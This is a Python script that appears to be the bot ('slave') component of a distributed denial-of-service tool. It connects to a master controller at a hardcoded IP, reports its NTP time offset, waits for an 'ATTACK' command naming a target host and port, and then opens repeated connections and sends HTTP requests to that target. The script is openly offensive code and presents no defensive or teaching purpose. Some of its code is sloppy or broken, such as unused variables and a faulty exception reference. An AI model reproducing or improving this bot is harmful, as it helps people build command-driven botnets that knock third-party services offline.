#!/usr/bin/env python3

import time
import os
import sys
import string
import ntplib
from socket import *
from time import ctime

# Setting up variables
SERVER_HOST = '192.168.0.113'  # Updated IP address
SERVER_PORT = 8080
MS_LISTEN_HOST = '192.168.0.113'  # Updated IP address
MS_LISTEN_PORT = 8081

class Slave:
    def __init__(self, host, port, sock=None):
        print("DDoS mode loaded")
        self.host = host
        self.port = port
        self.message = 'asdf'
        conn = int(input("How many connections do you want to make: "))
        ip = gethostbyname(self.host)
        self.num_connections = 0

        # Get NTP times
        ntpc = ntplib.NTPClient()
        ntp_res = ntpc.request('192.168.0.113', version=3)  # Updated IP address

        # Connect to master
        self.masterHost = MS_LISTEN_HOST
        self.masterPort = MS_LISTEN_PORT
        self.sockMaster = socket(AF_INET, SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))
        self.sockMaster.send(f'Slave offset is: {ntp_res.offset}'.encode('utf-8'))

    def acceptMessages(self):
        msg_buf = self.sockMaster.recv(64).decode('utf-8')
        if len(msg_buf) > 0:
            print(msg_buf)
            if msg_buf.startswith('ATTACK'):
                command, host, port, offset = msg_buf.split()
                self.doTheDos(host, int(port), float(offset))

    def doTheDos(self, host, port, offset):
        for _ in range(5):  # Updated range to Python 3 syntax
            self.dos(host, port)

    def dos(self, host, port):
        try:
            self.ddos = socket(AF_INET, SOCK_STREAM)
            self.ddos.connect((host, port))
            self.ddos.send(f"GET /{self.message} HTTP/1.1\r\n".encode('utf-8'))
        except socket.error as msg:
            self.num_connections += 1
            print(f"|[Connection Failed] | {self.num_connections}")
        print("|[DDoS Attack Engaged] |")
        # self.ddos.close()  # Uncomment if you want to close the connection

if __name__ == '__main__':
    slaveNode = Slave('localhost', 8080)

    while True:
        slaveNode.acceptMessages()
